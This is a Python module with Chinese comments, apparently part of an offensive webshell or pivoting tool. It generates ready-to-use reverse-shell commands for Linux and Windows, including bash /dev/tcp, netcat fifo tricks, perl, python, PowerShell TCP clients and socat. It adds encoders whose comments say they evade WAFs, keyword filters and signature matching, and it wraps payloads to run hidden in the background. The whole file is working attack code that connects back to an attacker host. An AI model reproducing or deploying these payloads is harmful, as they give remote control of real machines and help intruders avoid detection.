"""反弹 Shell 载荷库（服务层）：多语法 / 多编码 / 多平台，纯函数可单测。

为什么需要「多语法 + 多编码」——三条来自真实靶场的教训：

1. **执行壳决定语法**：目标 /bin/sh 多为 dash（Debian/Ubuntu）。bash 专属的
   `bash -i >& /dev/tcp/ip/port 0>&1` 直接丢给 dash 会报 `Bad fd number`。
   因此每条载荷都带 `ctx`（sh / bash）标记，由包装器显式 `bash -c` 或 `sh -c`
   执行，不再依赖目标的默认 sh 方言；`bash -i` 这类 bash 专属语法一律走 bash。

2. **工具决定可用性**：nc（OpenBSD 版已无 -e）/ perl / python3 / socat / base64 /
   xxd / openssl 等按目标真实探测（`command -v`）标注。缺工具的组合在下发前就能
   看到「本目标不可用」，而不是下发后收一条 command not found 再猜。

3. **编码形态对抗特殊字符干扰**：WAF / 参数过滤 / Java `Runtime.exec(String)`
   按空格切词等场景下，引号、空格、`>`、`&` 会被吃掉或改写。提供
   Base64（base64/perl/openssl 三种解码）/ Hex / 八进制 printf / `$'…'` /
   分片拼接 / 落盘执行 / 无空格 argv 等形态，把危险字符在下发前消除。

关于 `${IFS}`（真机实测结论，2026-09 于 Debian 9 + OpenBSD nc 靶场）：
`${IFS}` 只适合做**普通参数之间**的分隔（`cat${IFS}/etc/passwd` 成立），
一旦紧贴重定向语法就会失效——`>/tmp/x${IFS}2>&1` 会把 `${IFS}` 连同 `2` 吃成文件名
（`cannot create /tmp/x \t\n2: Permission denied`），`-i${IFS}>&${IFS}/dev/tcp/…`
则在 /bin/sh 为 dash 时报 `Syntax error: Bad fd number`。因此本库**不提供**
`${IFS}` 形态的反弹载荷；需要「整条不含空格」时用 `$'…'`（ANSI-C 引号，实测可用）。
执行器若按空格切词（Java `Runtime.exec(String)`），用 argv 组的无空格形态。

本模块只做「生成字符串」，不执行、不下发；所有输出可在单测里逐字节断言。
"""

from __future__ import annotations

import base64
from dataclasses import dataclass
from typing import Callable, Optional

from ..session.base import SessionError

#: 前端「探测目标工具」用的统一命令（PIVOTHUB_HAVE:<tool> 行，不依赖 shell 方言）
PROBE_TOOLS: tuple[str, ...] = (
    "bash", "sh", "nc", "ncat", "socat", "perl", "python3", "python",
    "php", "ruby", "node", "gawk", "busybox", "telnet",
    "base64", "xxd", "openssl", "curl", "wget", "timeout", "script", "mkfifo", "mknod",
)

#: 目标侧探测命令（Linux）：逐工具回 `PIVOTHUB_HAVE:<name>`，未命中不回行
PROBE_CMD_LINUX = (
    "for c in " + " ".join(PROBE_TOOLS) + "; do "
    "command -v $c >/dev/null 2>&1 && echo PIVOTHUB_HAVE:$c; done"
)
#: Windows：cmd 里没有 command -v，走 PowerShell 的 Get-Command
PROBE_CMD_WINDOWS = (
    'powershell -NoP -NonI -Command "'
    "foreach($c in 'powershell','nc','ncat','certutil','curl','bitsadmin'){"
    "if(Get-Command $c -ErrorAction SilentlyContinue){"
    "Write-Output ('PIVOTHUB_HAVE:'+$c)}}\""
)

_IP_OK = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_:")


# ---------------------------------------------------------------------------
# 编解码小工具（纯函数）
# ---------------------------------------------------------------------------

def _b64(s: str) -> str:
    return base64.b64encode(s.encode("utf-8")).decode("ascii")


def _hexs(s: str) -> str:
    return s.encode("utf-8").hex()


def _octal(s: str) -> str:
    """printf 的八进制转义序列（\\NNN，0-255 逐字节）。"""
    return "".join("\\%03o" % b for b in s.encode("utf-8"))


def _ansic(s: str) -> str:
    """$'…' ANSI-C 引号：整条命令收缩成**单个不含空格**的 token。

    空格 / 引号 / 重定向符全部写成 \\xNN，因此对「按空格切词」的执行器
    （Java Runtime.exec(String)）与「过滤空格」的 WAF 都成立。
    """
    parts = []
    for b in s.encode("utf-8"):
        ch = chr(b)
        parts.append(ch if 33 <= b < 127 and ch not in ("'", "\\") else "\\x%02x" % b)
    return "$'" + "".join(parts) + "'"


def _shq(s: str) -> str:
    """POSIX 单引号转义（命令里已含单引号时也不会撕碎外层包装）。"""
    return "'" + s.replace("'", "'\\''") + "'"


def validate_target(ip: str, port: int) -> tuple[str, int]:
    """校验回连地址/端口（命令会被拼进 shell，这里做白名单式拦截）。"""
    ip = (ip or "").strip()
    try:
        port = int(port)
    except (TypeError, ValueError):
        raise SessionError(f"端口不是数字: {port!r}")
    if not ip:
        raise SessionError("回连地址为空：先在「攻击机监听地址」里填本机 IP")
    if not set(ip) <= _IP_OK:
        raise SessionError(f"回连地址含非法字符（只允许字母数字 . - _ :）: {ip!r}")
    if not 1 <= port <= 65535:
        raise SessionError(f"端口越界（1-65535）: {port}")
    return ip, port


# ---------------------------------------------------------------------------
# 载荷规格：core = 核心命令（不含后台包装），由 render() 统一包装/编码
# ---------------------------------------------------------------------------

Build = Callable[[str, int], str]


@dataclass(frozen=True)
class Spec:
    id: str
    label: str
    group: str
    platform: str          # linux | windows
    ctx: str               # sh | bash | argv | ps | cmd
    build: Build
    needs: tuple[str, ...] = ()
    note: str = ""


@dataclass(frozen=True)
class Group:
    key: str
    label: str


GROUPS: tuple[Group, ...] = (
    Group("linux-shell", "Linux · Shell 直连（无需额外工具）"),
    Group("linux-tools", "Linux · 依赖目标工具（按探测结果选择）"),
    Group("linux-argv", "Linux · 无空格形态（空格过滤 / Java exec(String)）"),
    Group("windows-ps", "Windows · PowerShell"),
    Group("windows-cmd", "Windows · cmd / 需上传工具"),
)


def _linux_specs() -> list[Spec]:
    return [
        Spec(
            id="bash-tcp", label="bash /dev/tcp（经典）", group="linux-shell",
            platform="linux", ctx="bash", needs=("bash",),
            build=lambda ip, p: f"bash -i >& /dev/tcp/{ip}/{p} 0>&1",
            note="Debian/Ubuntu 的 /bin/sh 是 dash，必须显式 bash 执行；"
                 "否则 dash 解析 `>&` 报 Bad fd number（本面板已自动 bash -c 包裹）。",
        ),
        Spec(
            id="bash-exec3", label="bash exec 3<> 双向（无 -i）", group="linux-shell",
            platform="linux", ctx="bash", needs=("bash",),
            build=lambda ip, p: f"exec 3<>/dev/tcp/{ip}/{p}; sh <&3 >&3 2>&3",
            note="不依赖 bash -i 的交互初始化（部分精简镜像里 -i 会卡住）。",
        ),
        Spec(
            id="bash-readloop", label="bash 管道回读循环", group="linux-shell",
            platform="linux", ctx="bash", needs=("bash",),
            build=lambda ip, p: (
                f"exec 5<>/dev/tcp/{ip}/{p}; cat <&5 | while read l; do $l 2>&5 >&5; done"
            ),
            note="老式回显同步写法：逐条读命令逐条回结果，无 job control。",
        ),
        Spec(
            id="nc-fifo", label="nc + mkfifo（OpenBSD nc）", group="linux-shell",
            platform="linux", ctx="sh", needs=("nc",),
            build=lambda ip, p: (
                f"rm -f /tmp/.pf;mkfifo /tmp/.pf;"
                f"cat /tmp/.pf|/bin/sh -i 2>&1|nc {ip} {p} >/tmp/.pf"
            ),
            note="OpenBSD 版 nc 已移除 -e，用 fifo 把 stdin/stdout 接起来；"
                 "/tmp 不可写时把路径换成 /dev/shm/.pf。",
        ),
        Spec(
            id="nc-e", label="nc -e（传统 netcat / busybox nc）", group="linux-shell",
            platform="linux", ctx="sh", needs=("nc",),
            build=lambda ip, p: f"nc -e /bin/sh {ip} {p}",
            note="OpenBSD 版 nc 不支持 -e（invalid option），下发前先看工具探测结果。",
        ),
        Spec(
            id="nc-mknod", label="nc + mknod（无 mkfifo 的精简环境）", group="linux-shell",
            platform="linux", ctx="sh", needs=("nc",),
            build=lambda ip, p: (
                f"rm -f /tmp/.pf;mknod /tmp/.pf p;"
                f"cat /tmp/.pf|/bin/sh -i 2>&1|nc {ip} {p} >/tmp/.pf"
            ),
            note="busybox/精简镜像里常常没有 mkfifo，但 mknod 通常还在。",
        ),
        Spec(
            id="perl", label="perl socket 直连", group="linux-tools",
            platform="linux", ctx="sh", needs=("perl",),
            build=lambda ip, p: (
                "perl -e 'use Socket;"
                f"$i=\"{ip}\";$p={p};"
                "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
                "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                "exec(\"/bin/sh -i\");};'"
            ),
            note="perl 在 Debian 基础镜像里几乎必装，是最常用的兜底。",
        ),
        Spec(
            id="socat", label="socat PTY（交互质量最好）", group="linux-tools",
            platform="linux", ctx="sh", needs=("socat",),
            build=lambda ip, p: (
                f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{p}"
            ),
            note="直接给真 PTY（Ctrl+C、vim、su 都正常），目标装了 socat 就优先用它。",
        ),
        Spec(
            id="python3", label="python3 pty 直连", group="linux-tools",
            platform="linux", ctx="sh", needs=("python3",),
            build=lambda ip, p: (
                "python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{ip}\",{p}));"
                "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                "subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
        ),
        Spec(
            id="python", label="python2 pty 直连", group="linux-tools",
            platform="linux", ctx="sh", needs=("python",),
            build=lambda ip, p: (
                "python -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{ip}\",{p}));"
                "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
                "subprocess.call([\"/bin/sh\",\"-i\"])'"
            ),
            note="老镜像里 python 指向 python2，语法与 python3 版一致。",
        ),
        Spec(
            id="php", label="php fsockopen", group="linux-tools",
            platform="linux", ctx="sh", needs=("php",),
            build=lambda ip, p: (
                f"php -r '$s=fsockopen(\"{ip}\",{p});"
                "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            ),
        ),
        Spec(
            id="ruby", label="ruby TCPSocket", group="linux-tools",
            platform="linux", ctx="sh", needs=("ruby",),
            build=lambda ip, p: (
                "ruby -rsocket -e '"
                f"c=TCPSocket.new(\"{ip}\",{p});"
                "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
            ),
        ),
        Spec(
            id="node", label="node net 直连", group="linux-tools",
            platform="linux", ctx="sh", needs=("node",),
            build=lambda ip, p: (
                "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),"
                f"s=net.connect({p},\"{ip}\"),sh=cp.spawn(\"/bin/sh\",[]);"
                "s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);})()'"
            ),
        ),
        Spec(
            id="gawk", label="gawk /inet/tcp", group="linux-tools",
            platform="linux", ctx="sh", needs=("gawk",),
            build=lambda ip, p: (
                "awk 'BEGIN{s=\"/inet/tcp/0/"
                f"{ip}/{p}\";while(1){{printf \"$ \"|&s;s|&getline c;"
                "if(c){while((c|&getline)>0)print|&s;close(c)}}}'"
            ),
            note="仅 gawk 支持 /inet/tcp；mawk（Debian 默认 awk）与 busybox awk 都无效。",
        ),
        Spec(
            id="telnet", label="telnet + mkfifo（无 nc 时）", group="linux-tools",
            platform="linux", ctx="sh", needs=("telnet",),
            build=lambda ip, p: (
                f"rm -f /tmp/.pf;mkfifo /tmp/.pf;"
                f"cat /tmp/.pf|/bin/sh -i 2>&1|telnet {ip} {p} >/tmp/.pf"
            ),
            note="telnet 不传 stderr、退格与 Ctrl+C 体验差，仅作 nc 缺席时的兜底。",
        ),
        Spec(
            id="argv-brace", label="无空格花括号（仅 Java exec(String) 执行器）",
            group="linux-argv", platform="linux", ctx="argv", needs=("bash", "base64"),
            build=lambda ip, p: _nospace_form(
                f"bash -i >& /dev/tcp/{ip}/{p} 0>&1"
            ),
            note="整条命令只有 bash/-c 两处空格，其余用 {echo,<B64>}|{base64,-d}|bash "
                 "花括号展开——**只在按空格切词、不做 shell 解析的执行器**"
                 "（Java Runtime.exec(String)：JSP 一句话马常见形态）下成立；"
                 "经 /bin/sh（dash 无花括号展开）下发会报 `{base64,-d}: not found`，"
                 "这种目标请改用下面的 $'…' 形态。可用「探测执行语境」按钮自动判断。",
        ),
        Spec(
            id="argv-ansic", label="无空格 $'…' 单 token（shell 与 argv 通用）",
            group="linux-argv", platform="linux", ctx="argv", needs=("bash",),
            build=lambda ip, p: "bash -c " + _ansic(
                f"bash -i >& /dev/tcp/{ip}/{p} 0>&1"
            ),
            note="空格与符号全部写成 \\xNN：脚本是单个 token，外层 sh 原样透传给 bash -c，"
                 "对 exec(String) 切词与空格过滤都成立——真机实测（dash 执行器）可回连。",
        ),
    ]


def _windows_specs() -> list[Spec]:
    ps_direct = "start /b powershell -NoP -NonI -W Hidden -Exec Bypass "
    ps_body = (
        "$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$o=(iex $d 2>&1|Out-String);"
        "$sb=([text.encoding]::ASCII).GetBytes($o);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
    )

    def _ps(ip: str, port: int) -> str:
        # PowerShell 花括号与 $ 无法用 str.format → 占位符替换
        return ps_body.replace("{ip}", ip).replace("{port}", str(port))
    return [
        Spec(
            id="ps-tcp", label="PowerShell TCP 直连（明文）", group="windows-ps",
            platform="windows", ctx="ps", needs=("powershell",),
            build=lambda ip, p: ps_direct + '-c "' + _ps(ip, p) + '"',
            note="cmd 上下文里用 start /b 起后台；含引号，若漏洞点会吃掉引号改用编码形态。",
        ),
        Spec(
            id="ps-enc", label="PowerShell -EncodedCommand（Base64/UTF-16LE）",
            group="windows-ps", platform="windows", ctx="ps", needs=("powershell",),
            build=lambda ip, p: ps_direct + "-EncodedCommand " + _ps_encoded(_ps(ip, p)),
            note="Base64 载荷自带 -EncodedCommand 解码：双引号/单引号/空格全部不出现，"
                 "对「过滤引号」「日志留存明文命令」两类场景都有效。",
        ),
        Spec(
            id="ps-b64-iex", label="PowerShell IEX + FromBase64String", group="windows-ps",
            platform="windows", ctx="ps", needs=("powershell",),
            build=lambda ip, p: (
                ps_direct + '-c "IEX([Text.Encoding]::UTF8.GetString('
                f'[Convert]::FromBase64String(\'{_b64(_ps(ip, p))}\')))"'
            ),
            note="只用到 Base64 与 IEX，不含 -EncodedCommand 特征；"
                 "载荷是 UTF-8 编码，与 ps-enc 的 UTF-16LE 不同，两者互为备份。",
        ),
        Spec(
            id="nc-exe", label="nc.exe -e（需先上传）", group="windows-cmd",
            platform="windows", ctx="cmd", needs=("nc",),
            build=lambda ip, p: f"start /b nc.exe -e cmd.exe {ip} {p}",
            note="目标机没有 nc.exe 时先经「文件」模块上传到可写目录再执行。",
        ),
    ]


def _ps_encoded(script: str) -> str:
    """PowerShell -EncodedCommand 要求的 Base64(UTF-16LE)。"""
    return base64.b64encode(script.encode("utf-16-le")).decode("ascii")


def _nospace_form(core: str) -> str:
    """无空格 argv 形态：brace 展开 + Base64，整条命令仅 bash/-c 两处空格。

    Java `Runtime.exec(String)` 按空白切词且**不做引号解析**，所以
    `bash -c 'bash -i >& /dev/tcp/... 0>&1'` 会被切成 6 个参数而失败；
    这里让第三个 token 变成无空格的 `{echo,B64}|{base64,-d}|bash`，
    bash 收到脚本后再做花括号展开与管道，命令因此完整还原。
    """
    return f"bash -c {{echo,{_b64(core)}}}|{{base64,-d}}|bash"


SHELL_CTX = ("sh", "bash")


def _apply_encoder(key: str, core: str, spec: Spec) -> str:
    """把核心命令包成编码形态（返回的仍是「可被 shell 解读的一段文本」）。"""
    interp = "bash" if spec.ctx == "bash" else "sh"
    if key == "raw":
        return core
    if key == "base64":
        return f"echo {_b64(core)}|base64 -d|{interp}"
    if key == "base64-perl":
        return (f"perl -MMIME::Base64 -e 'print decode_base64(\"{_b64(core)}\")'"
                f"|{interp}")
    if key == "base64-openssl":
        return f"echo {_b64(core)}|openssl base64 -d -A|{interp}"
    if key == "hex":
        return f"echo {_hexs(core)}|xxd -r -p|{interp}"
    if key == "octal":
        if "%" in core:  # printf 的格式串里 % 会被当转换指令，如实拒绝而不是给出坏载荷
            raise SessionError("该载荷含 % 字符，printf 八进制编码会与格式串冲突：请改用 base64/hex")
        return f"printf '{_octal(core)}'|{interp}"
    if key == "ansic":
        return f"{interp} -c {_ansic(core)}"
    if key == "concat":  # 分片拼接：单一特征串被打散，规避长度/关键字匹配
        b = _b64(core)
        third = max(1, len(b) // 3)
        a, c, d = b[:third], b[third:2 * third], b[2 * third:]
        return f"a={a};b={c};c={d};echo $a$b$c|base64 -d|{interp}"
    if key == "tmpfile":  # 落盘再执行：命令本体不经过外层 shell 的行内解析
        name = "/tmp/.ph%s.sh" % "".join(
            ch if ch.isalnum() else "_" for ch in spec.id[:8])
        return (f"echo {_b64(core)}|base64 -d>{name};"
                f"{interp} {name};rm -f {name}")
    if key == "nospace":
        return _nospace_form(core)
    raise SessionError(f"未知编码方式: {key}")


@dataclass(frozen=True)
class Encoder:
    key: str
    label: str
    ctx: tuple[str, ...]
    needs: tuple[str, ...] = ()
    note: str = ""
    #: 是否跳过后台包装（argv 语境由执行器直接拉起，套 nohup 反而坏事）
    skip_wrap: bool = False


ENCODERS: tuple[Encoder, ...] = (
    Encoder("raw", "原样（不编码）", ("sh", "bash", "argv", "ps", "cmd"),
            note="最直观；若漏洞点或 WAF 会吃特殊字符，换下面的编码形态。"),
    Encoder("base64", "Base64 → base64 -d（最常用）", SHELL_CTX, ("base64",),
            note="命令本体不再出现引号/重定向/&，只留字母数字与 +/=。"),
    Encoder("base64-perl", "Base64 → perl MIME::Base64 解码", SHELL_CTX, ("perl",),
            note="目标没有 coreutils 的 base64 命令、但有 perl 时用。"),
    Encoder("base64-openssl", "Base64 → openssl base64 -d", SHELL_CTX, ("openssl",),
            note="极简镜像里 base64/perl 都缺、但带 openssl 时用。"),
    Encoder("hex", "Hex → xxd -r -p", SHELL_CTX, ("xxd",),
            note="纯十六进制字符集，对「只允许 [0-9a-f]」一类的参数过滤友好。"),
    Encoder("octal", "八进制 printf（shell 内建）", SHELL_CTX,
            note="printf 是 shell 内建，几乎不依赖外部命令；只出现反斜杠与数字。"),
    Encoder("ansic", "$'…' ANSI-C 引号（单 token 无空格）", SHELL_CTX, ("bash",),
            note="空格/引号/重定向全部 \\xNN 化：可对抗空格过滤与按空格切词的执行器。"),
    Encoder("concat", "Base64 分片拼接", SHELL_CTX, ("base64",),
            note="密文拆成 a/b/c 三段再拼，规避对完整 Base64 串的特征匹配。"),
    Encoder("tmpfile", "落盘脚本再执行", SHELL_CTX, ("base64",),
            note="先把命令落到 /tmp 再执行，行内不出现任何危险字符；执行后自删。"),
    Encoder("nospace", "无空格 argv（{echo,B64}|{base64,-d}|bash）", ("sh", "bash", "argv"),
            ("bash", "base64"), skip_wrap=True,
            note="专治 Java exec(String) 按空格切词；不套 nohup 后台包装（会引入空格），"
                 "WebShell 端提示「无回显」属正常，回连成功即可。"),
)

_ENCODER_BY_KEY = {e.key: e for e in ENCODERS}


# ---------------------------------------------------------------------------
# 渲染
# ---------------------------------------------------------------------------

def _wrap_background(cmd: str, ctx: str) -> str:
    """后台包装：WebShell 的 exec 会等命令结束，前台反弹会被挂断/回收。"""
    if ctx == "argv":
        return cmd
    if ctx in ("ps", "cmd"):
        return cmd if cmd.startswith("start /b") else "start /b " + cmd
    shell = "bash" if ctx == "bash" else "sh"
    return f"nohup {shell} -c {_shq(cmd)} >/dev/null 2>&1 &"


def all_specs() -> list[Spec]:
    return _linux_specs() + _windows_specs()


def get_spec(spec_id: str) -> Spec:
    for s in all_specs():
        if s.id == spec_id:
            return s
    raise SessionError(f"未知载荷: {spec_id}")


def encoders_for(spec: Spec) -> list[Encoder]:
    return [e for e in ENCODERS if spec.ctx in e.ctx]


def _spec_dict(spec: Spec) -> dict:
    return {"id": spec.id, "label": spec.label, "group": spec.group,
            "platform": spec.platform, "ctx": spec.ctx, "needs": list(spec.needs),
            "note": spec.note}


def render(spec_id: str, ip: str, port: int, encode: str = "raw",
           background: bool = True, tools: Optional[set] = None) -> dict:
    """渲染一条载荷（含编码与后台包装）。ip/port/encode 不合法时抛 SessionError。"""
    spec = get_spec(spec_id)
    enc = _ENCODER_BY_KEY.get(encode)
    if enc is None:
        raise SessionError(f"未知编码方式: {encode}")
    if spec.ctx not in enc.ctx:
        raise SessionError(
            f"编码「{enc.label}」不适用于载荷 {spec.id}（{spec.ctx} 语境）："
            f"可用编码 {', '.join(e.key for e in encoders_for(spec))}")
    ip, port = validate_target(ip, port)
    core = spec.build(ip, port)
    out = _apply_encoder(enc.key, core, spec)
    if background and not enc.skip_wrap:
        out = _wrap_background(out, spec.ctx)
    missing = sorted(t for t in spec.needs if tools is not None and t not in tools)
    enc_missing = sorted(t for t in enc.needs if tools is not None and t not in tools)
    return {
        "ok": True, "id": spec.id, "label": spec.label, "group": spec.group,
        "platform": spec.platform, "ctx": spec.ctx,
        "encode": enc.key, "encodeLabel": enc.label,
        "cmd": out, "needs": list(spec.needs), "missing": missing,
        "encodeNeeds": list(enc.needs), "encodeMissing": enc_missing,
        "available": tools is None or not (missing or enc_missing),
        "note": spec.note, "encodeNote": enc.note,
        "background": bool(background and not enc.skip_wrap),
    }


def catalog(ip: str = "", port: int = 0, platform: str = "",
            tools: Optional[set] = None) -> dict:
    """载荷目录：分组语法 + 可用编码。ip 为空时给出占位符版本（ready=False）。

    工具集 tools 来自目标真实探测（PROBE_CMD_LINUX/WINDOWS 的 PIVOTHUB_HAVE 行）：
    传了就把每条载荷标注 available / missing，前端据此提示「本目标不可用」。
    """
    items = []
    ready = bool((ip or "").strip())
    render_ip = (ip or "").strip() or "ATTACKER_IP"
    render_port = int(port) if int(port or 0) > 0 else 4444
    for spec in all_specs():
        entry = _spec_dict(spec)
        entry["encoders"] = [
            {"key": e.key, "label": e.label, "needs": list(e.needs), "note": e.note}
            for e in encoders_for(spec)
        ]
        try:
            entry["cmd"] = render(spec.id, render_ip, render_port, "raw",
                                  background=True, tools=tools)["cmd"]
            entry["error"] = ""
        except SessionError as e:  # 目录不做整体失败：单条渲染失败只标错
            entry["cmd"] = ""
            entry["error"] = str(e)
        entry["missing"] = sorted(
            t for t in spec.needs if tools is not None and t not in tools)
        entry["available"] = tools is None or not entry["missing"]
        items.append(entry)
    groups = [{"key": g.key, "label": g.label,
               "items": [i for i in items if i["group"] == g.key]}
              for g in GROUPS]
    groups = [g for g in groups if g["items"]]
    if platform:
        groups = [
            {**g, "items": [i for i in g["items"] if i["platform"] == platform]}
            for g in groups
        ]
        groups = [g for g in groups if g["items"]]
        items = [i for i in items if i["platform"] == platform]
    return {
        "ok": True, "ready": ready, "ip": render_ip, "port": render_port,
        "groups": groups, "items": items,
        "encoders": [{"key": e.key, "label": e.label, "ctx": list(e.ctx),
                      "needs": list(e.needs), "note": e.note} for e in ENCODERS],
        "probeCmd": PROBE_CMD_WINDOWS if platform == "windows" else PROBE_CMD_LINUX,
        "tools": sorted(tools) if tools is not None else None,
    }
